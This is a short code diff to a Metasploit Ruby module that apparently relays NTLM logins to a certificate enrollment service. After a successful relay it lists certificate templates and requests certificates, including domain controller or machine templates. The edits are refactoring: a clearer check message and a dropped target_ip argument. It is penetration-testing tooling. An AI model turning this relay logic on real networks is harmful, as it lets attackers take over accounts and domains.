@@ -72,7 +72,7 @@ class MetasploitModule < Msf::Auxiliary
     )
     disconnect
 
-    return Exploit::CheckCode::Unknown if res.nil?
+    return Exploit::CheckCode::Unknown('No response received from target') if res.nil?
     unless res.code == 401
       return Exploit::CheckCode::Safe('The target does not require authentication.')
     end
@@ -128,23 +128,22 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def on_relay_success(relay_connection:, relay_identity:)
-    target_ip = relay_connection.target.ip
     case datastore['MODE']
     when 'AUTO'
       cert_template = relay_identity.end_with?('$') ? ['DomainController', 'Machine'] : ['User']
-      retrieve_certs(target_ip, relay_connection, relay_identity, cert_template)
+      retrieve_certs(relay_connection, relay_identity, cert_template)
     when 'ALL', 'QUERY_ONLY'
       cert_templates = get_cert_templates(relay_connection)
       unless cert_templates.nil? || cert_templates.empty?
         print_status('***Templates with CT_FLAG_MACHINE_TYPE set like Machine and DomainController will not display as available, even if they are.***')
         print_good("Available Certificates for #{relay_identity} on #{datastore['RELAY_TARGET']}: #{cert_templates.join(', ')}")
         if datastore['MODE'] == 'ALL'
-          retrieve_certs(target_ip, relay_connection, relay_identity, cert_templates)
+          retrieve_certs(relay_connection, relay_identity, cert_templates)
         end
       end
     when 'SPECIFIC_TEMPLATE'
       cert_template = datastore['CERT_TEMPLATE']
-      retrieve_cert(target_ip, relay_connection, relay_identity, cert_template)
+      retrieve_cert(relay_connection, relay_identity, cert_template)
     end
 
     vprint_status('Relay tasks complete; waiting for next login attempt.')
